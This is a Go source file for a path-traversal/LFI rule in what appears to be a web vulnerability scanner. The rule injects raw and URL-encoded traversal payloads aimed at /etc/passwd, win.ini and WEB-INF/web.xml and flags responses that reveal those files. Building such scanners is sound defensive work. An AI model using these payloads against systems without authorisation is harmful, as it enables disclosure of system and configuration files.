// Package pathtraversal is the active path-traversal / LFI rule. Each check replaces
// the parameter with traversal payloads for one target file and confirms when the
// response returns that file's contents.
package pathtraversal

import (
	"context"
	"regexp"

	"github.com/BishopFox/joro/internal/activescan"
	"github.com/BishopFox/joro/internal/activescan/injkit"
	"github.com/BishopFox/joro/internal/detect"
)

const (
	ruleID      = "pathtraversal"
	findingRule = "activescan.pathtraversal"
)

var (
	rePasswd = regexp.MustCompile(`root:.*:0:0:`)
	reWinIni = regexp.MustCompile(`(?i)\[(?:fonts|extensions|mci extensions)\]|for 16-bit app support`)
	reWebXML = regexp.MustCompile(`(?i)<web-app[\s>]`)
)

func fileCheck(id, name, desc string, payloads []string, re *regexp.Regexp, evidence string) injkit.Check {
	return injkit.Check{
		ID: id, Name: name, Severity: detect.SeverityHigh, Description: desc, Payloads: payloads,
		Probe: func(pc injkit.ProbeCtx) { probe(pc, payloads, re, evidence) },
	}
}

var checks = []injkit.Check{
	fileCheck("unix-passwd", "Unix /etc/passwd",
		"Traverses to /etc/passwd and matches the user-database format.",
		[]string{"../../../../../../../../etc/passwd", "/etc/passwd", "....//....//....//....//etc/passwd"},
		rePasswd, "response contains /etc/passwd contents (root:...:0:0:)"),
	fileCheck("windows-winini", "Windows win.ini",
		"Traverses to Windows win.ini and matches its section headers.",
		[]string{"..\\..\\..\\..\\..\\windows\\win.ini", "C:\\windows\\win.ini"},
		reWinIni, "response contains win.ini contents"),
	fileCheck("java-webxml", "Java WEB-INF/web.xml",
		"Reads WEB-INF/web.xml from a Java web app.",
		[]string{"/WEB-INF/web.xml", "../../WEB-INF/web.xml"},
		reWebXML, "response contains WEB-INF/web.xml contents"),
	fileCheck("encoded", "Encoded traversal",
		"URL-encoded traversal to /etc/passwd (filter-bypass variants).",
		[]string{"..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "..%5c..%5c..%5c..%5cwindows%5cwin.ini"},
		rePasswd, "response contains /etc/passwd contents via encoded traversal"),
}

type Rule struct{ *activescan.DisabledSet }

func New() *Rule { return &Rule{activescan.NewDisabledSet()} }

func (*Rule) ID() string                { return ruleID }
func (*Rule) Name() string              { return "Path traversal / LFI" }
func (*Rule) Category() detect.Category { return detect.CategoryPathTraversal }
func (*Rule) Description() string {
	return "Replaces each parameter with directory-traversal payloads (encoded and raw, Unix and " +
		"Windows) and reports when the response returns the contents of a well-known file " +
		"(/etc/passwd, win.ini, WEB-INF/web.xml) — confirmed path traversal / local file inclusion."
}

func (r *Rule) CatalogItems() []activescan.CatalogItem {
	return injkit.Catalog(checks, r.DisabledSet, false)
}

func (r *Rule) Run(ctx context.Context, t activescan.Target, cfg activescan.Config, deps activescan.RuleDeps, rep activescan.Reporter) error {
	injkit.RunChecks(ctx, t, cfg, deps, rep, checks, r.DisabledSet, findingRule, detect.CategoryPathTraversal, "Path traversal / LFI")
	return nil
}

func probe(pc injkit.ProbeCtx, payloads []string, re *regexp.Regexp, evidence string) {
	for _, pl := range payloads {
		res := pc.Inject(pl, false)
		if res != nil && re.Match(res.Resp.Body) {
			pc.File(detect.SeverityHigh, "path traversal in "+pc.Point.Name+" via "+pl, evidence, res.URL)
			return
		}
	}
}
